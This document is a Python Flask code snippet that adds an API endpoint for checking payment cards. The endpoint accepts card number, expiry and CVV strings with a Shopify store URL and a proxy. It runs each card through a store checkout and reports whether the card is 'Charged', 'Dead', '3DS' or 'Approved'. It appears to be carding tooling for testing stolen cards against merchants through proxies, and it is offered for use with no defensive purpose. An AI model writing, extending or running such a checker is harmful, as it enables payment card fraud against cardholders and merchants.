# Add this new endpoint at the bottom of your api.py (before if __name__)

@app.route('/')
def api_root():
    """Main endpoint that mimics the old API format (62.72.20.10:8081/)"""
    try:
        # Old API format: parameters are the card itself (no parameter name)
        # Example: ?5455122802569146|12|26|543&url=https://site.com&proxy=proxy
        
        # Get the card - it's the first argument (no key name)
        card = None
        for key, value in request.args.items():
            if '|' in value and len(value.split('|')) >= 4:
                card = value
                break
        
        # Also check if 'cc' parameter exists (new format)
        if not card:
            card = request.args.get('cc')
        
        # Get site URL
        site = request.args.get('url') or request.args.get('site')
        
        # Get proxy (if provided)
        proxy = request.args.get('proxy')
        
        if not card or not site:
            return jsonify({
                "Response": "Missing card or URL parameter",
                "Price": "-",
                "Gate": "Unknown",
                "Status": "Error"
            })
        
        # Parse card
        parts = card.split('|')
        if len(parts) < 4:
            return jsonify({
                "Response": "Invalid card format. Use: CC|MM|YY|CVV",
                "Price": "-",
                "Gate": "Unknown",
                "Status": "Error"
            })
        
        cc = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        if len(yy) == 2:
            yy = "20" + yy
        
        if not site.startswith('http'):
            site = 'https://' + site
        
        # Run the Shopify check
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card(cc, mm, yy, cvv, site, None, proxy)
            )
        finally:
            loop.close()
        
        # Format response exactly like old API
        if success and message == "ORDER_PLACED":
            status = "Charged"
        elif success and "CARD_DECLINED" in message:
            status = "Dead"
        elif success and "3DS" in message:
            status = "3DS"
        elif success:
            status = "Approved"
        else:
            status = "Dead"
        
        # Price formatting
        try:
            price_float = float(price)
            price_str = f"${price_float:.2f}"
        except:
            price_str = f"${price}"
        
        response_data = {
            "Response": message,
            "Price": price_str,
            "Gate": gateway if gateway else "Shopify Payments",
            "Status": status
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "Response": f"Error: {str(e)[:100]}",
            "Price": "-",
            "Gate": "Unknown",
            "Status": "Error"
        })

# Keep your existing /shopify endpoint for compatibility